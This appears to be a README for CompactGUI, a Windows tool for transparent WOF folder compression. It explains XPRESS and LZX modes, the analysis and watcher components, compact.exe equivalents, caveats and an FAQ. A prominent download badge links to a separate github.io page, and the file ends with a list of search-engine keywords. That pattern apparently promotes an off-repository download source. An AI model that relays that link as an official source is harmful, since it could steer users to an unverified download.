# CompactGUI Transparent Compression for Games and Programs

[![GET CompactGUI](https://img.shields.io/badge/GET-CompactGUI-16A34A?style=for-the-badge&labelColor=14532D)](https://compactgui-compression.github.io/compactgui-game-compressor/)

CompactGUI is a Windows interface for transparent folder compression.

It helps reduce the disk space occupied by suitable games, applications, and other large folders without packaging their contents into conventional archives.

Files remain available to Windows and compatible applications in their original locations.

CompactGUI uses compression facilities already provided by Windows, including the Windows Overlay Filter and supported XPRESS or LZX algorithms.

![CompactGUI folder compression interface](core/photo1.jpg)

## How It Works

Traditional archives must usually be extracted before their contents can be used.

Transparent compression works differently.

Windows stores compressed data on disk and decompresses it automatically when an application reads the file.

CompactGUI provides a graphical workflow around this native behavior.

The main compression process is implemented in [Compactor.cs](Core/Compactor.cs), while [Uncompactor.cs](Core/Uncompactor.cs) handles decompression requests.

This approach can be useful for large folders containing files that compress well and are read much more often than they are modified.

Actual savings depend on the data.

Already compressed videos, audio, archives, and many modern game assets may show little improvement.

## Uses

Common uses include:

- Reducing the installed size of compatible PC games.
- Compressing large program directories.
- Comparing several Windows compression algorithms.
- Monitoring selected folders for newly added files.
- Reclaiming space without maintaining separate archive files.
- Reviewing compressed and uncompressed sizes from one interface.

The application metadata and current prerelease version information can be reviewed in [Version.xml](Version.xml).

The solution layout is defined by [CompactGUI.slnx](CompactGUI.slnx).

## Compression Modes

CompactGUI exposes four Windows Overlay Filter compression modes.

| Mode | Compression ratio | Relative speed | Typical use |
| --- | --- | --- | --- |
| XPRESS4K | Lower | Fastest | Frequently accessed files or slower CPUs |
| XPRESS8K | Moderate | Fast | General-purpose compression |
| XPRESS16K | Higher | Slower | Folders where additional savings matter |
| LZX | Highest | Slowest | Large, mostly static data |

Algorithm identifiers are mapped to their Windows API values in [WOFHelper.cs](Core/WOFHelper.cs).

XPRESS8K is a practical starting point for many folders.

LZX can produce better savings on suitable data, but compression and decompression require more processing work.

Benchmark representative folders before applying one mode broadly.

## Choosing an Algorithm

Choose a mode according to the storage device, processor, file types, and frequency of access.

For a game that loads many small assets, XPRESS4K or XPRESS8K may provide a better balance.

For rarely modified applications or archival program folders, XPRESS16K or LZX may save more space.

Do not assume that the strongest algorithm is automatically the best option.

Measure both the resulting size and application behavior.

![CompactGUI compression mode selection](core/photo2.jpg)

## Compression Workflow

CompactGUI first examines the target and determines which files should be processed.

[Analyser.cs](Core/Analyser.cs) tracks compressed and uncompressed sizes, file counts, and relevant folder changes.

[Estimator.cs](Core/Estimator.cs) samples data to estimate potential savings before a full operation.

A typical workflow is:

1. Select a game or application folder.
2. Analyse its existing files.
3. Review estimated savings.
4. Select a compression mode.
5. Start compression.
6. Review the final size and status.
7. Launch and test the affected application.

CompactGUI itself is a graphical application.

The following commands use Windows `compact.exe` to demonstrate the corresponding system behavior, not a separate CompactGUI command-line interface.

```powershell
compact.exe /c /s /a /i /exe:XPRESS8K "D:\Games\Example\*"
compact.exe /q /s "D:\Games\Example\*"
```

Always replace the example path with a specific folder that you have verified.

## Analysis and Estimation

A complete folder scan provides more reliable figures than judging compression by the size of one file.

The estimator can sample candidate files and account for storage characteristics when preparing an estimate.

Results are still predictions.

The final ratio may differ because files have different formats, internal compression levels, and allocation behavior.

Low-level NTFS operations and file metadata access are implemented in [NTFSInterop.cs](Core/NTFSInterop.cs).

Files can also be filtered before processing through the matching logic in [SkipListMatcher.cs](Core/SkipListMatcher.cs).

## Parallel Processing and Recovery

Large folders may contain thousands of files.

[ParallelFileRunner.cs](Core/ParallelFileRunner.cs) coordinates parallel work, progress reporting, pause requests, and cancellation.

Parallel processing can improve throughput, especially on fast storage and multicore systems.

It can also increase temporary CPU and disk activity.

[FileOperationRecovery.cs](Core/FileOperationRecovery.cs) handles recoverable operation failures, including conditions associated with insufficient free space.

Keep some free disk space available during a compression job.

Do not interrupt the computer by forcibly powering it off while files are being changed.

## Background Watcher

CompactGUI includes components for monitoring selected folders.

[Watcher.vb](Watcher/Watcher.vb) manages watched-folder activity and connects it with background processing.

[WatchedFolder.vb](Watcher/WatchedFolder.vb) represents folder configuration, status, and the selected compression level.

[BackgroundCompactor.vb](Watcher/BackgroundCompactor.vb) coordinates compression work initiated by the watcher.

[IdleDetector.vb](Watcher/IdleDetector.vb) helps determine whether scheduled background activity can run while the system is idle.

This mode is useful when a launcher, updater, or application regularly adds new files to an already compressed directory.

Review watched folders after major application updates.

An update may replace compressed files or introduce data that should be excluded.

![CompactGUI watched folders and results](core/photo3.png)

## Settings and Explorer Integration

Application preferences are represented in [Settings.cs](Core/Settings/Settings.cs).

Available settings cover areas such as:

- Selected compression mode.
- File and folder exclusions.
- Watched folders.
- Background scheduling.
- Explorer integration.
- Analysis and interface preferences.

Explorer integration can make folder-level actions easier to reach from the Windows context menu.

Use that integration only for folders you recognize.

System directories, entire drives, and actively managed Windows components are poor targets for casual compression.

## Compression Results

There is no universal space-saving percentage.

Use analysis results and real tests to decide whether a folder is worth compressing.

| Content type | Likely outcome | Notes |
| --- | --- | --- |
| Plain text and uncompressed data | Strong savings | Often compresses efficiently |
| Executables and libraries | Variable savings | Depends on existing structure |
| Modern game assets | Low to moderate | Many assets already use compression |
| Video, audio, and archives | Usually low | Data is commonly compressed already |
| Frequently rewritten data | Poor candidate | Recompression adds unnecessary work |

Compare the folder's allocated size before and after processing.

A small saving may not justify stronger compression on a frequently accessed application.

## Caveats

Transparent compression is not a substitute for backups.

It also does not protect files from deletion, corruption, malware, or hardware failure.

Avoid using CompactGUI indiscriminately on:

- The entire Windows installation.
- Complete system drives.
- Databases with frequent writes.
- Virtual machine disk images.
- Folders managed by security or backup software without testing.
- Data already compressed with efficient media or archive formats.

Some applications verify files or replace them during updates.

After a repair or update, analyse the folder again before recompressing it.

## DirectStorage Considerations

Windows DirectStorage and transparent WOF compression are not always an appropriate combination.

A game designed to use DirectStorage may depend on a particular storage and asset delivery path.

Compression can remove or reduce the intended benefit.

CompactGUI analysis includes logic for identifying relevant DirectStorage indicators, but automatic detection should not replace checking the game's documentation.

For a DirectStorage title, leave the installation uncompressed unless compatibility has been confirmed.

## Technical Details

[FolderChangeMonitor.cs](Core/FolderChangeMonitor.cs) observes filesystem changes and debounces repeated events before requesting further work.

Windows native calls and structures used by the core are declared through the project's interop layer.

The application separates folder analysis, compression, decompression, estimation, settings, logging, and watcher responsibilities.

This structure makes it possible to update individual behaviors without concentrating all filesystem logic in the user interface.

The current source represents a WPF and modern .NET rewrite of the application.

## Availability

CompactGUI may be distributed through supported Windows package managers.

```powershell
winget install CompactGUI
choco install compactgui
```

Package availability and identifiers can change.

Review the package source, publisher, and version before approving an installation.

The source repository remains useful for inspecting implementation details and release information.

## Restoring Uncompressed Files

Files can be returned to an uncompressed state.

Use CompactGUI's decompression action for folders previously processed by the application.

The comparable Windows system command is:

```powershell
compact.exe /u /s /a /i /exe:XPRESS8K "D:\Games\Example\*"
```

Decompression requires enough free space to store the expanded data.

Check available capacity before processing a large folder.

## Troubleshooting

If a folder shows little or no reduction, its files may already be compressed.

Try another representative folder or compare the analysis for a different algorithm.

If files are skipped, review extension and path exclusions.

If a process cannot access a file, close the application or launcher using it and retry.

If background processing does not run, verify the watched-folder state, idle settings, and schedule.

If a game behaves unexpectedly, decompress its folder and verify the game files through its launcher.

If an operation stops because the disk is full, free additional space before retrying.

## Frequently Asked Questions

### Does CompactGUI create archive files?

No. It applies transparent Windows filesystem compression to eligible files in their existing folders.

### Must games be extracted before launch?

No. Windows presents the files normally and handles decompression during access.

### Does every game become much smaller?

No. Results depend on the contents of each installation.

### Can compression reduce performance?

It can change CPU and storage workloads.

The effect may be negligible, beneficial, or noticeable depending on the hardware and application.

### Can a compressed folder be restored?

Yes. Use the decompression operation and make sure sufficient free space is available.

### Is LZX always the recommended mode?

No. LZX favors compression ratio, while XPRESS modes can offer faster access and processing.

## Contributing

Before proposing a change, reproduce the behavior with a clearly identified folder and compression mode.

Include relevant Windows, storage, application, and CompactGUI version information in reports.

Keep filesystem operations cancellable and preserve recovery behavior when modifying the processing pipeline.

Changes affecting algorithms or exclusions should be tested against compressible, incompressible, empty, locked, and frequently modified files.

## License

CompactGUI is distributed under the license included with its source repository.

Review the license before redistributing the application or incorporating its code into another project.

Third-party packages and Windows components may have their own terms.

## Related Search Terms

compactgui compression, compactgui game compressor, compact gui, compactgui ntfs compression, compactgui transparent compression, windows, windows-11, compression, ntfs, wof, game-compression, disk-space, xpress, lzx, dotnet, wpf
